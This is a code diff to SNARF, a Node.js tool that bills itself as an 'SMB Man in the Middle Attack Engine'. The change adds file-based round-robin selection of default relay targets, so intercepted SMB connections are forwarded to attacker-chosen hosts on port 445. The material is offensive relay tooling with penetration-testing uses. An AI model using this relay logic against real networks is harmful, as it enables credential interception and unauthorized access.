@@ -45,22 +45,26 @@
 // Date:    2013-11-30
 //
 
-var util = require('util');
-var net  = require('net');
-var smb  = require("./smb.js");
-var out  = require ("./out.js");
-var midl = require("./middler.js");
-var ctrl = require("./control.js");
-var rout = require("./router.js");
-var SMBBroker = require("./smbbroker.js").SMBBroker;
-var Getopt = require("node-getopt");
+var util       = require('util');
+var net        = require('net');
+var smb        = require("./smb.js");
+var out        = require ("./out.js");
+var midl       = require("./middler.js");
+var ctrl       = require("./control.js");
+var rout       = require("./router.js");
+var SMBBroker  = require("./smbbroker.js").SMBBroker;
+var Getopt     = require("node-getopt");
+var RL         = require('readline');
+var fs         = require('fs');
+var cycle      = require("./cycle.js");
 
 out.red("SNARF - 0.2 - SMB Man in the Middle Attack Engine");
 out.red("by Josh Stone (yakovdk@gmail.com) and Victor Mata (TBD)");
 
 getopt = new Getopt([
     ['d', 'defaultip=IP'                , 'Default IP (think LLMNR or NBNS)'],
-    ['h', 'help',                          , 'Show help and usage statement']
+    ['f', 'file=FILE'                   , 'Round-robin default destination from file'],
+    ['h', 'help',                       , 'Show help and usage statement']
 ]);
 
 getopt.setHelp(
@@ -83,9 +87,27 @@ var client;
 var count = 0;
 var globals = new Object;
 
-globals.defip = opt.options["defaultip"] ? opt.options["defaultip"] : "0.0.0.0";
+//
+// One of the more useful features is the ability to send a request
+// that is sent directly to the listening service to a "default" IP of
+// the attacker's choice.  Well, as useful as this is, it's even
+// better to be able to specify a variety of targets.  This code sets
+// up the global settings for either a single default, a circular list
+// of targets, or no default at all.
+//
 
-out.red("Default IP is " + globals.defip);
+if(opt.options['defaultip']) {
+    globals.editip = true;
+    globals.defip  = function() { return opt.options["defaultip"]; };
+} else if(opt.options['file']) {
+    var roundrobin  = new cycle.fromFile(opt.options['file']);
+    globals.editip  = false;
+    globals.defpeek = function() { return roundrobin.current() }
+    globals.defip   = function() { return roundrobin.shift() }
+} else {
+    globals.editip = true;
+    globals.defip  = null;
+}
 
 ctrl.ControlPanel(broker, 4001, globals);
 
@@ -95,15 +117,14 @@ client = net.createServer(function(sock) {
     
     router.checkout(sock.remoteAddress, sock.remotePort, function(tip) {
         if(tip == bindip || tip == "0.0.0.0") {
-            if(globals.defip && globals.defip != "0.0.0.0") {
-                if(globals.defip != sock.remoteAddress) {
-                    out.red("Got inbound connection, routing to default");
-                    tip = globals.defip;
+            if(globals.defip) { // && globals.defip != "0.0.0.0") {
+                var target = globals.defip();
+                if(target != sock.remoteAddress) {
+                    out.red("Got inbound connection, routing to " + target);
+                    tip = target;
                 } else {
-                    
                     // Consider the MS09-001 check
-                    
-                    out.red("Received connection from " + globals.defip + " to " + globals.defip);
+                    out.red("Received connection from " + target + " to " + target);
                     out.red("Not middling (it wouldn't work anyway)");
                     midl.NullMiddler(sock);
                     return;
@@ -116,6 +137,7 @@ client = net.createServer(function(sock) {
                 return;
             }
         }
+        out.red("Destination is " + tip);
         var server = net.connect({port: 445, host: tip}, function() {
             out.red("Server connected, will relay to " + tip);
             var middler = new midl.Middler(count);
